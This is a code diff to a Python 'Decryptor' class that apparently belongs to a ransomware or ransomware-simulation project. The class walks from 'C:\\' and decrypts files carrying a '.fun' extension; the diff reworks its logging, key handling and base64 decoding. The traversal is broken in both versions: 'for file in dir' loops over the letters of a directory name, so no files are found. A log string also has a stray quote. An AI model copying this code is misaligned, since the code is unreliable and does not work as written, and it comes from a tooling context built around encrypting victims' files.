@@ -15,18 +15,17 @@ class Decryptor:
         self._extension: str   = ".fun";
 #public
     def search_and_destroy(self, path: str = "C:\\"):
-        if self._key_b64 or self._plain_key:
-            key: bytes = self.__decode_base64(self._key_b64) if self._key_b64 else self._plain_key;
+        log_info(f'[INFO] Search and destroy"');
+        key: bytes | None = self.__decode_base64(self._key_b64) if self._key_b64 else self._plain_key;
+        if key:
             for root, dirs, _ in os.walk(path, topdown=True):
-                log_info(f'[INFO] searching on {path}');
                 for dir in dirs:
+                    log_info(f'[INFO] searching on {root}');
                     for file in dir:
                         try:
                             file_path: Path = Path(root) / dir / file;
                             if file_path.suffix ==  self._extension:
                                 self.__decrypt_file(str(file_path), key);
-                            if(file_path.is_dir):
-                                self.search_and_destroy(file_path);
                         except Exception as e:
                             log_error(f"[ERROR] Error while processing: {e}");
         else:
@@ -53,4 +52,7 @@ class Decryptor:
             log_error(f"[ERROR] Error while removing encryption: {e}");
 
     def __decode_base64(self, data: str):
-        return base64.b64decode(data);
+        try:
+            return base64.b64decode(data);
+        except Exception as e:
+            log_error(f"[ERROR] Error while decoding key: {e}");
